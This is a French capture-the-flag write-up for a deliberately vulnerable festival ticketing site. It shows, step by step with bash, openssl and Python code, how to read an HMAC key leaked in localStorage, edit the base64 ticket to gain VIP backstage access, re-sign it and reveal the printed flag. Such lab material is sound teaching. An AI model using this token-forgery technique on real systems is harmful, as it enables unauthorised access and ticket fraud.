# Pass Partout (Ticket Forgery + Leaked HMAC Key)

**Flag :** `HSR{p4ss_p4rt0ut_4cc3s_b4ckst4g3!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Obtenir un billet](#étape-1---obtenir-un-billet)
- [Étape 2 - Fouiller le localStorage](#étape-2---fouiller-le-localstorage)
- [Étape 3 - Décoder le billet](#étape-3---décoder-le-billet)
- [Étape 4 - Modifier le billet](#étape-4---modifier-le-billet)
- [Étape 5 - Recalculer la signature HMAC](#étape-5---recalculer-la-signature-hmac)
- [Étape 6 - Utiliser le billet forgé](#étape-6---utiliser-le-billet-forgé)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à la billetterie du HSR Music Festival 2026. On peut obtenir un billet gratuit (zone générale). La zone backstage VIP est réservée. Les billets sont signés par un HMAC-SHA256.

---

## Étape 1 - Obtenir un billet

On clique sur " Obtenir mon billet ". On est redirigé vers :

```
/event?ticket=eyJpZCI6ImFiYzEyMyIsImhvbGRlciI6Imd1ZXN0IiwidGllciI6InN0YW5kYXJkIiwiYWNjZXNzIjpbImdlbmVyYWwiXX0=.a1b2c3d4e5f6...
```

On remarque que le ticket contient deux parties séparées par un `.` : le payload base64 et une signature.

---

## Étape 2 - Fouiller le localStorage

On ouvre les DevTools (F12) > onglet **Application** > **Local Storage**. On y trouve une entrée `debug_config` :

```json
{"integrity":"hmac-sha256","sign_key":"s1gn1ng-n0t-f0r-pr0d","sign_data":"json","env":"dev"}
```

On a maintenant :
- L'algorithme : HMAC-SHA256
- La clé : `s1gn1ng-n0t-f0r-pr0d`

> **Note :** On peut aussi trouver le script qui écrit dans le localStorage en inspectant le code source de la page (`<script>localStorage.setItem("debug_config", ...)</script>`).

---

## Étape 3 - Décoder le billet

On décode la première partie (avant le `.`) qui est du base64 :

```bash
echo "eyJpZCI6..." | base64 -d
```

Résultat :

```json
{"id":"abc123","holder":"guest","tier":"standard","access":["general"]}
```

---

## Étape 4 - Modifier le billet

On modifie `tier` en `"vip"` et on ajoute `"backstage"` dans le tableau `access` :

```json
{"id":"abc123","holder":"guest","tier":"vip","access":["general","backstage"]}
```

On ré-encode en base64 :

```bash
echo -n '{"id":"abc123","holder":"guest","tier":"vip","access":["general","backstage"]}' | base64
```

---

## Étape 5 - Recalculer la signature HMAC

Le champ `sign_data: "json"` dans le localStorage indique que le HMAC est calculé sur le JSON brut (pas le base64).

On signe le JSON modifié avec la clé trouvée :

```bash
echo -n '{"id":"abc123","holder":"guest","tier":"vip","access":["general","backstage"]}' | openssl dgst -sha256 -hmac 's1gn1ng-n0t-f0r-pr0d'
```

On peut aussi utiliser Python :

```python
import hmac, hashlib, base64, json

key = "s1gn1ng-n0t-f0r-pr0d"
ticket = {"id":"abc123","holder":"guest","tier":"vip","access":["general","backstage"]}
json_str = json.dumps(ticket, separators=(",", ":"))
payload = base64.b64encode(json_str.encode()).decode()
sig = hmac.new(key.encode(), json_str.encode(), hashlib.sha256).hexdigest()
print(f"{payload}.{sig}")
```

---

## Étape 6 - Utiliser le billet forgé

On remplace le paramètre `ticket` dans l'URL par `nouveau_base64.nouveau_hmac` et on recharge la page.

Le flag s'affiche :

```
HSR{p4ss_p4rt0ut_4cc3s_b4ckst4g3!}
```

---

## Résumé de la chaîne de résolution

```
Billetterie (festival)
  |
  |-- Obtenir un billet -> ticket base64.hmac dans l'URL
          |
          |-- Inspecter le localStorage (DevTools > Application) -> clé HMAC dans debug_config
                    |
                    |-- Décoder le base64 -> JSON avec tier: "standard"
                              |
                              |-- Modifier tier -> "vip", ajouter "backstage" dans access
                                        |
                                        |-- Recalculer HMAC du JSON + ré-encoder en base64 -> flag
```
